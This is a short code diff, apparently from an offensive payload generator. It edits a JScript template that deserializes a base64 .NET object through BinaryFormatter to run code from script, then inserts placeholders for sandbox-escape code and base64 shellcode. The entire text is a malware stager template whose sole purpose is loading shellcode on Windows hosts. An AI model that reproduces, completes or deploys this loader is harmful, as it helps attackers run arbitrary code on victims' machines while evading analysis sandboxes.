@@ -232,12 +232,9 @@ try {
 	setversion();
 	var stm = base64ToStream(serialized_obj);
 	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
-	var al = new ActiveXObject('System.Collections.ArrayList');
-	var n = fmt.SurrogateSelector;
 	var d = fmt.Deserialize_2(stm);
-	al.Add(n);
-	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
-	
+	var o = d.DynamicInvoke(undefined).CreateInstance(entry_class);
+
 %SANDBOX_ESCAPES%
 
 	var sc = "%SHELLCODE64%";
